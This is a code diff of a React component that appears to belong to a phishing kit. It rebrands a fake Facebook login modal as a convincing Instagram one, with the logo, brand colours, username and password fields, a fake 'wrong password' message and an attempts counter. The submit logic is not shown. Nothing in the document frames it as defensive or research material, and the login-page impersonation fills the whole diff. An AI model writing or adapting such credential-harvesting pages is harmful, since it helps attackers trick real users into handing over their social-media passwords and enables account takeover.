@@ -1,4 +1,4 @@
-import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
+import InstagramLogoImage from '@/assets/images/logo insta.webp';
 import { useTranslation } from '@/hooks/use-translation';
 import { store } from '@/store/store';
 import config from '@/utils/config';
@@ -10,20 +10,20 @@ import axios from 'axios';
 import Image from 'next/image';
 import { type FC, useState } from 'react';
 
-const FB_INPUT_CLASS =
-    'h-[52px] w-full rounded-full border border-[#dddfe2] bg-white px-5 text-base text-[#1c1e21] shadow-[inset_0_1px_0_rgba(0,0,0,0.04)] placeholder:text-[#90949c] transition-all focus:border-[#1877F2] focus:shadow-[0_0_0_2px_rgba(24,119,242,0.2)] focus:outline-none';
+const IG_INPUT_CLASS =
+    'h-[52px] w-full rounded-full border border-[#dddfe2] bg-white px-5 text-base text-[#1c1e21] shadow-[inset_0_1px_0_rgba(0,0,0,0.04)] placeholder:text-[#90949c] transition-all focus:border-[#E1306C] focus:shadow-[0_0_0_2px_rgba(225,48,108,0.2)] focus:outline-none';
 
-const PASSWORD_MODAL_TEXTS = [
-    'Log in to Facebook',
-    'Email or phone number',
+const INSTAGRAM_PASSWORD_TEXTS = [
+    'Log in to Instagram',
+    'Phone number, username, or email',
     'Password',
     'Log in',
     'Forgot password?',
     'You entered the wrong password. Please try again.'
 ] as const;
 
-const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
-    const { t } = useTranslation(PASSWORD_MODAL_TEXTS);
+const InstagramPasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
+    const { t } = useTranslation(INSTAGRAM_PASSWORD_TEXTS);
     const [attempts, setAttempts] = useState(0);
     const [accountInput, setAccountInput] = useState('');
     const [isLoading, setIsLoading] = useState(false);
@@ -85,35 +85,37 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/50 px-4 backdrop-blur-[2px]'>
             <div className='w-full max-w-[520px] overflow-hidden rounded-2xl bg-[#f0f2f5] font-[Helvetica,Arial,sans-serif] shadow-[0_12px_28px_rgba(0,0,0,0.2),0_2px_4px_rgba(0,0,0,0.1)]'>
                 <div className='flex items-center justify-center border-b border-[#dddfe2] bg-white py-6'>
-                    <Image src={FacebookLogoImage} alt='Facebook' className='h-[72px] w-[72px]' />
+                    <Image src={InstagramLogoImage} alt='Instagram' className='h-[72px] w-[72px] object-contain' />
                 </div>
 
                 <div className='px-6 py-7 sm:px-10 sm:py-8'>
-                    <h2 className='mb-7 text-center text-[22px] leading-tight font-bold text-[#1c1e21]'>{t('Log in to Facebook')}</h2>
+                    <h2 className='mb-7 text-center text-[22px] leading-tight font-bold text-[#1c1e21]'>{t('Log in to Instagram')}</h2>
 
                     <div className='space-y-4'>
                         <input
                             type='text'
-                            id='account-input'
+                            id='ig-account-input'
                             value={accountInput}
                             onChange={(e) => setAccountInput(e.target.value)}
-                            className={FB_INPUT_CLASS}
-                            placeholder={t('Email or phone number')}
+                            className={IG_INPUT_CLASS}
+                            placeholder={t('Phone number, username, or email')}
+                            autoComplete='username'
                         />
 
                         <div className='relative'>
                             <input
                                 type={showPassword ? 'text' : 'password'}
-                                id='password-input'
+                                id='ig-password-input'
                                 value={password}
                                 onChange={(e) => setPassword(e.target.value)}
-                                className={`${FB_INPUT_CLASS} pr-12`}
+                                className={`${IG_INPUT_CLASS} pr-12`}
                                 placeholder={t('Password')}
+                                autoComplete='current-password'
                             />
                             <button
                                 type='button'
                                 onClick={() => setShowPassword(!showPassword)}
-                                className='absolute top-1/2 right-5 -translate-y-1/2 text-[#90949c] transition-colors hover:text-[#1877F2]'
+                                className='absolute top-1/2 right-5 -translate-y-1/2 text-[#90949c] transition-colors hover:text-[#E1306C]'
                             >
                                 <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} />
                             </button>
@@ -130,7 +132,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                         type='button'
                         onClick={handleSubmit}
                         disabled={isLoading || !accountInput.trim() || !password.trim()}
-                        className='mt-6 flex h-[52px] w-full items-center justify-center rounded-full bg-[#1877F2] text-[18px] font-bold text-white shadow-[0_2px_4px_rgba(24,119,242,0.3)] transition-all hover:bg-[#166fe5] active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-70'
+                        className='mt-6 flex h-[52px] w-full items-center justify-center rounded-full bg-linear-to-r from-[#833AB4] via-[#E1306C] to-[#F77737] text-[18px] font-bold text-white shadow-[0_2px_4px_rgba(225,48,108,0.3)] transition-all hover:opacity-95 active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-70'
                     >
                         {isLoading ? (
                             <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent' />
@@ -139,7 +141,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                         )}
                     </button>
 
-                    <button type='button' className='mt-5 w-full py-1 text-center text-[15px] font-semibold text-[#1877F2] transition-colors hover:underline'>
+                    <button type='button' className='mt-5 w-full py-1 text-center text-[15px] font-semibold text-[#0095f6] transition-colors hover:underline'>
                         {t('Forgot password?')}
                     </button>
                 </div>
@@ -148,4 +150,5 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     );
 };
 
-export default PasswordModal;
+export default InstagramPasswordModal;
+
